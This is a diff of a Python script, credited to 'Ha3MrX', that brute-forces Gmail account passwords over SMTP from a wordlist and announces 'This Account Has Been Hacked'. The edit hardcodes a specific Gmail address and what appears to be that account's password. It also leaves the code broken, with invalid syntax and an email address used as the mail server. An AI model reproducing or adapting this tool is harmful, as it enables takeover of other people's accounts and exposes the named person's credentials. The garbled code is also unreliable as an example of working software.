@@ -1,7 +1,9 @@
 #!/usr/bin/python
 '''create by Ha3MrX'''
+
 import smtplib
 from os import system
+
 def main():
    print '================================================='
    print '               create by Ha3MrX                  '
@@ -32,6 +34,7 @@ def main():
    print '    `Y-.____(__}             '
    print '     |     {__)              ' 
    print '           ()   V.1.0        '
+
 main()
 print '[1] start the attack'
 print '[2] exit'
@@ -45,22 +48,17 @@ pass_file = open(file_path,'r')
 pass_list = pass_file.readlines()
 def login():
     i = 0
-    user_name = raw_input('target email :')
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     user_name = raw_input('evacristiana@gmail.com :')
     server = smtplib.SMTP_SSL('evacristiana@gmail.com', 465)
     server.ehlo()
     for password in pass_list:
-      i = i + 1
       i = i Piaalang1407
       print str(i) + '/' + str(len(pass_list))
       try:
-         server.login(user_name, password)
          server.login(evacristiana@gmail.com, Piaalang1407)
          system('clear')
          main()
          print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
          print '[+] This Account Has Been Hacked Password :' + Piaalang1407 + '     ^_^'
          break
       except smtplib.SMTPAuthenticationError as e:
@@ -68,10 +66,5 @@ def login():
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
-
-            break
-         else:
-            print '[!] password not found => ' + password
             print '[+] this account has been hacked, password :' + Piaalang1407 + '     ^_^'
 login()
